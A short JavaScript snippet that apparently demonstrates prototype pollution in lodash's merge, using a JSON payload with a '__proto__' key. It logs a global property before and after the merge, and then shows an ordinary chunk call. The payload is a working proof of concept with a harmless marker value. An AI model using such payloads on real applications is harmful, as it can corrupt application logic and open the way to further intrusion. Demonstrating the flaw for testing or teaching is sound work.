const _ = require('lodash');

// Example using lodash merge which has the prototype pollution vulnerability
const object = {};
const malicious = JSON.parse('{"__proto__": {"polluted": "yes"}}');

console.log('Before merge - Global polluted property:', {}.polluted);
_.merge({}, malicious);
console.log('After merge - Global polluted property:', {}.polluted);

// Some normal lodash usage
const array = [1, 2, 3, 4, 5];
console.log('Array chunk:', _.chunk(array, 2)); 